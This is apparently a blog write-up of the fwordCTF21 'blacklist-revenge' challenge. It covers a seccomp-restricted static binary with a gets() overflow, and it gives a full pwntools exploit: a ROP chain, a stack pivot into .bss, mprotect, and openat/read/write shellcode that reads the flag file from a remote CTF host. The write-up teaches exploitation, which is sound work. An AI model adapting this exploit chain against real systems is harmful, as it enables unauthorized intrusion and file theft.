I"#F<h1 id="intro">Intro</h1>

<h2 id="chit-chat">Chit-chat</h2>

<p>Been a while, huh?</p>

<p>This is a writeup for the <code class="language-plaintext highlighter-rouge">blacklist-revenge</code> challenge from <a href="https://ctftime.org/event/1405">fwordCTF21</a>. Its a pretty cool challenge, with some lessons to teach, and even though the challenge was, admittedly fairly easy I feel it still has educational value. Thats why i’m here, of course.</p>

<p>My previous statement about the challenge being “fairly easy” sounds quite ironic when you realise that I was not the one who originally solved the challenge; that was someone else on my team. Although I quite believe I <em>could</em> have solved the challenge for the team, had he not been so fast.</p>

<h2 id="the-challenge">The challenge</h2>

<p>Now that i’m done rambling, whats up with the challenge?</p>

<p>The description reads:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>It's time to revenge !
flag is in /home/fbi/flag.txt
Note : There is no stdout/stderr in the server , can you manage it this year?
</code></pre></div></div>

<p>With stdout + stderr disabled, this might pose a bit of a challenge when trying to exfiltrate the flag. 
I did my usual which is running <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code> on the binary, just to see what were dealing with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[~/D/f/BlackList_Revenge] : file blacklist                                                                          
blacklist: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=890009ffb99771b08ad8ac3971e9aef644bce402, for GNU/Linux 3.2.0, not stripped
[~/D/f/BlackList_Revenge] : checksec --file blacklist                                                        
[*] '/root/Documents/fword21/BlackList_Revenge/blacklist'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></div></div>

<p>This is already pretty promising; no PIE AND statically linked. This means once we find an exploitable bug we can immediately start ropping, so lets take a look inside.</p>

<h3 id="the-binary">The binary</h3>

<p>Starting from the beginning:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">init_0</span><span class="p">();</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It looks pretty simple, nice. Lets check out <code class="language-plaintext highlighter-rouge">init_0</code> first:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">init_0</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h]</span>
  <span class="n">__int64</span> <span class="n">filter</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-4h]</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">filter</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mh">0x7FFF0000LL</span><span class="p">);</span>          <span class="c1">// kill if encountered</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>                           <span class="c1">// open</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x38</span><span class="p">;</span>                        <span class="c1">// clone</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x39</span><span class="p">;</span>                        <span class="c1">// fork</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3A</span><span class="p">;</span>                        <span class="c1">// vfork</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x3B</span><span class="p">;</span>                        <span class="c1">// execve</span>
  <span class="n">syscall_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x142</span><span class="p">;</span>                       <span class="c1">// execveat</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">5</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="p">(</span><span class="n">seccomp_rule_add</span><span class="p">)(</span><span class="n">filter</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">syscall_arr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">seccomp_load</span><span class="p">(</span><span class="n">filter</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>You can see we disable buffering on stdin + out + err. We then piece together and load a seccomp filter. Here we restrict several syscalls., including <code class="language-plaintext highlighter-rouge">execve</code> and its brother <code class="language-plaintext highlighter-rouge">execveat</code>, so no shells for us ;(. Lets dump the seccomp rules with <code class="language-plaintext highlighter-rouge">seccomp-tools</code> as well, just to be sure:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">~/</span><span class="n">D</span><span class="o">/</span><span class="n">f</span><span class="o">/</span><span class="n">BlackList_Revenge</span><span class="p">]</span> <span class="o">:</span> <span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">blacklist</span> 
 <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mo">0000</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mo">0001</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x0a</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0002</span><span class="o">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mo">0003</span><span class="o">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0005</span>
 <span class="mo">0004</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x07</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0005</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">open</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0006</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x05</span> <span class="mh">0x00</span> <span class="mh">0x00000038</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">clone</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0007</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000039</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">fork</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x0000003a</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">vfork</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">000</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x0000003b</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execve</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0010</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x00000142</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">execveat</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0012</span>
 <span class="mo">0011</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
 <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
</code></pre></div></div>

<p>From the top, we can see they limit syscalls to 64 bit versions rather than 32, pretty sure this is the default, so this means no <code class="language-plaintext highlighter-rouge">int 0x80</code>s allowed, so cant bypass the filter that way.</p>

<p>Lets now take a look at the <code class="language-plaintext highlighter-rouge">vuln</code> function:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">vuln</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-40h] BYREF</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Classy, huh? I havent seen <code class="language-plaintext highlighter-rouge">gets()</code> used in a while so it was pretty cool to see it again. So to recap:</p>

<p>We have:</p>
<ul>
  <li>No PIE, and statically linked; many gadgets available to us right out the door.</li>
  <li>Easy bof vulnerability on the stack.</li>
  <li>… But, we cant get a shell, so we have to use some combination of ORW, but using <code class="language-plaintext highlighter-rouge">openat</code> instead of open to net us the flag.</li>
</ul>

<h1 id="exploitation">Exploitation</h1>

<p>My exploit is fairly simple. It has 3 stages:</p>

<ol>
  <li>Overflow buffer, rop together a call to <code class="language-plaintext highlighter-rouge">read</code> into the bss to load a stage 2. I do this because I dont want to deal with <code class="language-plaintext highlighter-rouge">gets()</code> and its badchars.</li>
  <li>Pivot the stack into the bss where a ropchain is waiting.</li>
  <li>The ropchain rwx’s the bss, then jumps to shellcode I had loaded after.</li>
</ol>

<p>Here’s what it looks like:</p>

<p>```py
from pwn import *
import string</p>

<p>context.arch = ‘amd64’</p>

<p>script = ‘’’
break *vuln+29
continue
‘’’</p>

<h1 id="print-out-contents-only-up-to-0x50-bytes-of-it-though-for-some-reason--of-a-file">Print out contents (only up to 0x50 bytes of it though for some reason :/) of a file.</h1>
<p>shellcode = asm(‘’’</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov rax, 0x101
mov rsi, rdi
xor rdi, rdi
xor rdx, rdx
xor r10, r10
syscall

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 0x50
syscall

mov rax, 1
mov rdi, 0
syscall

    ''')
</code></pre></div></div>

<p>def main():</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># For our socket shellcode. 
dataseg = 0x00000000004dd000
# Just inside read()
syscall = 0x457a00
# For stack pivot, because fuck gets()
pop_rbp = 0x41ed8f
leave = 0x0000000000401e78

rop = ROP("./blacklist")
elf = ELF("./blacklist")

# This is effected by bachars bcuz gets(), so im gonna load a stage2.
ropchain = flat(
    
    # I CBA dealing with the stack, so bss instead :)
    # read(0, dataseg, 0x1000)
    rop.rdi.address,                                                  
    0,   
    rop.rsi.address,
    dataseg,
    rop.rdx.address,
    0x1000,
    syscall,

    pop_rbp,
    dataseg+0x20, # +0x20 to leave room for filenames n shit
    leave,
        )

# This is not affected by badchars, bcuz read() :).
rop2 = flat(
    
    path := b"/home/fbi/flag.txt\x00",
    b"A"*(0x20 - (len(path) - 8)),
    
    # shellcode here because rop is annoying. 
    # mprotect(dataseg, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
    rop.rax.address,
    0x0a,
    rop.rdi.address,
    dataseg,
    rop.rsi.address,
    0x1000,
    rop.rdx.address,
    7,
    syscall,
    
    # Return into our shellcode...
    # Should srop into the somsled somewhere inside the GOT.
    dataseg+125,
    b"\x90"*50,
    shellcode,
    )

#p = process("./blacklist")
# nc 40.71.72.198 1236 
p = remote("40.71.72.198", 1236)
#gdb.attach(p, script)

p.sendline(b"A"*72 + ropchain)

# read() doesnt need a newline 
p.send(rop2)

# We should be recieving some data over stdin, which uses the same socket as stdout for comms with the server. So
# pretty much no difference between the 2.
buf = p.recvall()

# Clean output a lil 
printable = ""
for b in buf:
    for c in string.printable:
        if b == ord(c):
            printable += chr(b)

print(printable)
</code></pre></div></div>
:ET